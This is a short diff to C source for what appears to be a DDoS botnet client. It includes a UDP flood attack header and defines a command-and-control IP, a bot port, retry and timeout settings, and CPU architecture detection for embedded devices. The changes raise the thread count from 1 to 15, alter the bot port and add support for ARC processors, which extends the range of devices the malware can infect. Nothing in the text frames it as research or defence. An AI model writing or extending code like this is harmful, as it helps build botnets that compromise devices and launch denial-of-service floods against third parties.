@@ -31,8 +31,8 @@
 #include "headers/udpplain_attack.h"
 
 #define CNC_IP "127.0.0.1"
-#define BOT_PORT 1338
-#define MAX_THREADS 1
+#define BOT_PORT 1334
+#define MAX_THREADS 15
 #define RETRY_DELAY 2
 #define RECV_TIMEOUT_MS 12000
 #define MAX_RETRIES 30
@@ -70,12 +70,12 @@ const char* get_arch() {
     return "m68k";
     #elif defined(ARCH_i686)
     return "i686";
-    #elif defined(ARCH_x86)
-    return "x86";
     #elif defined(ARCH_x86_64)
     return "x86_64";
     #elif defined(ARCH_sh4)
     return "sh4";
+    #elif defined(ARCH_arc)
+    return "arc700";
     #else
     return "unknown";
     #endif
